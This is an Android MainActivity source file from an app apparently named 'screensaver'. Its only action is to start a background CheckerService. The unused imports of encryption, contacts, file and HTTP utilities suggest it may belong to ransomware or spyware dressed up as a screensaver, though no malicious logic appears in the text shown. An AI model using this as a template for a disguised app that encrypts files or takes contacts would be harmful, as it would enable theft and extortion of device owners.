package com.ins.screensaver;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.Toast;

import com.ins.screensaver.services.CheckerService;
import com.ins.screensaver.utils.AES;
import com.ins.screensaver.utils.ContactsUtils;
import com.ins.screensaver.utils.FileUtils;
import com.ins.screensaver.utils.HttpClient;
import com.ins.screensaver.utils.Memory;
import com.ins.screensaver.utils.Utils;

import java.io.File;
import java.net.URLEncoder;
import java.util.concurrent.locks.Lock;

import javax.crypto.Cipher;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        startService(new Intent(this, CheckerService.class));

    }
}
